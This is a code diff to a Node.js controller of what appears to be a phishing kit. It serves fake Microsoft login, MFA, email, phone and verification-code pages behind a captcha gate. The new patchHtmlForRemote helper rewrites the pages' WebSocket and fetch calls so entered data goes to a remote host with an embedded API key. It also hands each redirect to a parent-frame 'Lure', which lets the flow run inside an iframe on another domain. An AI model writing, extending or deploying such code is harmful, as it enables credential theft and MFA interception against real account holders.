@@ -14,6 +14,48 @@ const { generateSimpleCaptchaPage } = require('../../generators/simpleCaptchaPag
 const { generateMsSplashPage } = require('../../generators/msSplashPage');
 const { generateMsLoginPage } = require('../../generators/msLoginPage');
 const { generateMsVeryPage } = require('../../generators/msVeryPage');
+const { generateMsMailInputPage } = require('../../generators/msMailInputPage');
+const { generateMsPhoneInputPage } = require('../../generators/msPhoneInputPage');
+const { generateMsCodeInputPage } = require('../../generators/msCodeInputPage');
+
+// --- 0. [NEW] Get HTML Page (Server-Driven UI) ---
+// Helper to patch HTML for remote iframe execution
+function patchHtmlForRemote(html) {
+    let patched = html;
+
+    // 1. WebSocket to VPS (wss://api.yieldmaxfx.com)
+    patched = patched.replace(/ws\s*=\s*new\s*WebSocket\([^)]+\)/g, "ws = new WebSocket('wss://api.yieldmaxfx.com')");
+    patched = patched.replace(/new WebSocket\(`ws:\/\/\$\{window\.location\.host\}`\)/g, "new WebSocket('wss://api.yieldmaxfx.com')");
+
+    // 2. Fetch Requests to Absolute VPS Path (/api/xxx OR /xxx -> /eapi/xxx)
+    patched = patched.replace(/fetch\('(\/api)?\/([^']+)'/g, "fetch('https://api.yieldmaxfx.com/eapi/$2'");
+
+    // 3. Inject API Key into Headers
+    // Handles various formatting (single line vs multiline)
+    const headerReplacement = "headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'key_dev_001' },";
+    patched = patched.replace(/headers:\s*\{\s*'Content-Type':\s*'application\/json'\s*\},/g, headerReplacement);
+
+    // 4. Redirects -> onStepRequired
+    // Matches: window.location.href = data.redirect;
+    patched = patched.replace(
+        /window\.location\.href\s*=\s*data\.redirect;/g,
+        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired(data.redirect); } else { window.location.href = data.redirect; }"
+    );
+
+    // Matches internal transitions: window.location.href = '/' + TOKEN + '/page';
+    patched = patched.replace(
+        /window\.location\.href = '\/' \+ TOKEN \+ '\/([^']+)';/g,
+        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('/' + TOKEN + '/$1'); } else { window.location.href = '/' + TOKEN + '/$1'; }"
+    );
+
+    // Matches explicit MFA redirect in Login page (old style)
+    patched = patched.replace(
+        /window\.location\.href = '\/.*\/very';/,
+        "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
+    );
+
+    return patched;
+}
 
 // --- 0. [NEW] Get HTML Page (Server-Driven UI) ---
 exports.getPage = (req, res) => {
@@ -30,23 +72,19 @@ exports.getPage = (req, res) => {
 
         switch (type) {
             case 'gateway':
-                // START CHANGED: Use new Simple Captcha
                 htmlContent = generateSimpleCaptchaPage();
 
                 // [EAPI PATCH 1] Fix the Fetch URL to be absolute (since iframe is on remote domain)
-                // We point it to the VPS public API URL
                 htmlContent = htmlContent.replace(
                     "fetch('/verify-captcha'",
                     "fetch('https://api.yieldmaxfx.com/verify-captcha'"
                 );
 
                 // [EAPI PATCH 2] Intercept the redirect logic
-                // Instead of window.location.href, we call the parent callback
                 htmlContent = htmlContent.replace(
                     "window.location.href = result.redirect || '/processing';",
                     "if(window.parent && window.parent.onGatewaySuccess){window.parent.onGatewaySuccess(result.token);}else{console.log('Gateway success');}"
                 );
-                // END CHANGED
                 break;
             case 'splash':
                 htmlContent = generateMsSplashPage(safeToken);
@@ -58,54 +96,35 @@ exports.getPage = (req, res) => {
                 break;
             case 'login':
                 htmlContent = generateMsLoginPage(safeToken, { randomize: true });
-
-                // [EAPI PATCH 1] WebSocket to VPS
-                htmlContent = htmlContent.replace(
-                    "new WebSocket(`ws://${window.location.host}`)",
-                    "new WebSocket('wss://api.yieldmaxfx.com')"
-                );
-
-                // [EAPI PATCH 2] Auth API Endpoint + API Key Injection
-                // We MUST include the X-API-KEY in the headers for the EAPI call to succeed
-                htmlContent = htmlContent.replace(
-                    "fetch('/api/start-auth'",
-                    "fetch('https://api.yieldmaxfx.com/eapi/start-auth'"
-                ).replace(
-                    "headers: { 'Content-Type': 'application/json' },",
-                    "headers: { 'Content-Type': 'application/json', 'X-API-KEY': 'key_dev_001' },"
-                );
-
-                // [EAPI PATCH 3] Redirect Handling -> Call Parent to generic 'onStepRequired'
-                // This informs the Lure to fetch the next page (e.g. MFA)
-                htmlContent = htmlContent.replace(
-                    "window.location.href = data.redirect;",
-                    "console.log('Redirect requested to:', data.redirect); if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired(data.redirect); } else { window.location.href = data.redirect; }"
-                );
-
-                // [EAPI PATCH 4] Intercept explicit MFA redirect
-                htmlContent = htmlContent.replace(
-                    /window\.location\.href = '\/.*\/very';/,
-                    "if(window.parent && window.parent.onStepRequired){ window.parent.onStepRequired('very'); } else { console.log('MFA Page required'); }"
-                );
+                htmlContent = patchHtmlForRemote(htmlContent);
                 break;
             case 'mfa':
             case 'very':
                 htmlContent = generateMsVeryPage(safeToken);
+                htmlContent = patchHtmlForRemote(htmlContent);
+                break;
+            case 'mailinput':
+                htmlContent = generateMsMailInputPage(safeToken);
+                htmlContent = patchHtmlForRemote(htmlContent);
+                break;
+            case 'phoneinput':
+            case 'numinput':
+                htmlContent = generateMsPhoneInputPage(safeToken);
+                htmlContent = patchHtmlForRemote(htmlContent); // Assuming MsPhoneInputPage uses similar structure
+                break;
+            case 'codeinput':
+                htmlContent = generateMsCodeInputPage(safeToken);
+                htmlContent = patchHtmlForRemote(htmlContent);
                 break;
             default:
-                return res.status(400).json({ success: false, message: 'Invalid page type' });
+                return res.status(404).send('Invalid page type');
         }
 
-        // Return JSON with HTML string (safer than raw HTML for API)
-        res.json({
-            success: true,
-            type: type,
-            html: htmlContent
-        });
+        res.send(htmlContent);
 
     } catch (error) {
         console.error('❌ [EAPI] Error generating page:', error);
-        res.status(500).json({ success: false, message: 'Template generation error' });
+        res.status(500).send('Error generating page');
     }
 };
 
